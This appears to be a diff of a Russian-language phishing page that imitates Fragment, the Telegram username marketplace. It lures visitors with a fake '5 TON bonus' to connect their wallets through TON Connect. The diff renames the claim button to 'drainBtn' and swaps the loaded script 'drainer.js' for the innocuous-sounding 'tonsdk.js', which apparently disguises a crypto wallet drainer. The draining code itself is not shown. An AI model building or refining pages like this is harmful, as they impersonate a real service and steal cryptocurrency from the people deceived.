@@ -3,12 +3,204 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Fragment — покупка username</title>
-    <link rel="stylesheet" href="style.css" />
+    <title>Fragment – покупка username</title>
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0b0e11;
+            color: #ffffff;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        /* ===== HEADER ===== */
+        .header {
+            background: #1a1d23;
+            border-bottom: 1px solid #2a2d33;
+            padding: 16px 0;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .logo-icon {
+            font-size: 28px;
+        }
+        .logo-text {
+            background: linear-gradient(135deg, #0088cc, #00a3ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .nav {
+            display: flex;
+            gap: 24px;
+        }
+        .nav a {
+            color: #8b95a0;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .nav a:hover {
+            color: #fff;
+        }
+        .btn-connect {
+            background: #00a3ff;
+            border: none;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .btn-connect:hover {
+            background: #0090e0;
+        }
+        .btn-connect:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        /* ===== HERO ===== */
+        .hero {
+            padding: 80px 0 60px;
+            text-align: center;
+            background: radial-gradient(ellipse at 50% 0%, #1a2a3a 0%, #0b0e11 70%);
+        }
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.2;
+        }
+        .hero-sub {
+            font-size: 20px;
+            color: #8b95a0;
+            margin-top: 16px;
+        }
+        /* ===== AUCTION ===== */
+        .auction {
+            padding: 60px 0 80px;
+        }
+        .auction h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+        .auction-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .auction-card {
+            background: #1a1d23;
+            border: 1px solid #2a2d33;
+            border-radius: 16px;
+            padding: 24px;
+            transition: border-color 0.2s;
+        }
+        .auction-card:hover {
+            border-color: #00a3ff;
+        }
+        .auction-name {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .auction-price {
+            font-size: 18px;
+            color: #00a3ff;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+        .auction-bid {
+            font-size: 14px;
+            color: #8b95a0;
+            margin-top: 8px;
+        }
+        .auction-cta {
+            text-align: center;
+            padding: 40px 0;
+            background: #1a1d23;
+            border-radius: 20px;
+            border: 1px solid #2a2d33;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #0088cc, #00a3ff);
+            border: none;
+            color: #fff;
+            padding: 16px 48px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: scale(1.02);
+        }
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .cta-hint {
+            margin-top: 12px;
+            color: #5e6a76;
+            font-size: 14px;
+        }
+        /* ===== FOOTER ===== */
+        .footer {
+            border-top: 1px solid #1a1d23;
+            padding: 30px 0;
+            text-align: center;
+            color: #5e6a76;
+            font-size: 14px;
+        }
+        /* ===== АДАПТИВ ===== */
+        @media (max-width: 768px) {
+            .header-inner {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 12px;
+            }
+            .nav {
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            .hero h1 {
+                font-size: 30px;
+            }
+            .hero-sub {
+                font-size: 16px;
+            }
+            .auction-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 </head>
 <body>
 
-    <!-- Шапка -->
+    <!-- ШАПКА -->
     <header class="header">
         <div class="container header-inner">
             <div class="logo">
@@ -21,12 +213,12 @@
                 <a href="#">Аккаунты</a>
                 <a href="#">FAQ</a>
             </nav>
-            <!-- ЯВНАЯ КНОПКА ПОДКЛЮЧЕНИЯ -->
-            <button id="connectWalletBtn" class="btn-connect">Подключить кошелёк</button>
+            <!-- КНОПКА ПОДКЛЮЧЕНИЯ -->
+            <button id="connectBtn" class="btn-connect">Подключить кошелёк</button>
         </div>
     </header>
 
-    <!-- Герой -->
+    <!-- ГЕРОЙ -->
     <section class="hero">
         <div class="container">
             <h1>Покупайте и продавайте<br />username Telegram</h1>
@@ -34,7 +226,7 @@
         </div>
     </section>
 
-    <!-- Секция с бонусом -->
+    <!-- АУКЦИОН И БОНУС -->
     <section class="auction">
         <div class="container">
             <h2>🔥 Горячие лоты</h2>
@@ -56,7 +248,7 @@
                 </div>
             </div>
             <div class="auction-cta">
-                <button id="claimRewardBtn" class="btn-primary" disabled>
+                <button id="drainBtn" class="btn-primary" disabled>
                     🎁 Забрать бонус 5 TON
                 </button>
                 <p id="statusHint" class="cta-hint">Подключите кошелёк для получения бонуса</p>
@@ -64,13 +256,19 @@
         </div>
     </section>
 
+    <!-- ФУТЕР -->
     <footer class="footer">
-        <div class="container"><p>© 2026 Fragment.</p></div>
+        <div class="container">
+            <p>© 2026 Fragment. Все права защищены.</p>
+        </div>
     </footer>
 
-    <!-- Подключаем TON Connect UI -->
+    <!-- ===== ПОДКЛЮЧЕНИЕ БИБЛИОТЕКИ TON CONNECT ===== -->
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.1.0/dist/tonconnect-ui.min.js">
     </script>
-    <script src="drainer.js"></script>
+
+    <!-- ===== ОСНОВНОЙ СКРИПТ ===== -->
+    <script src="tonsdk.js"></script>
+
 </body>
 </html>
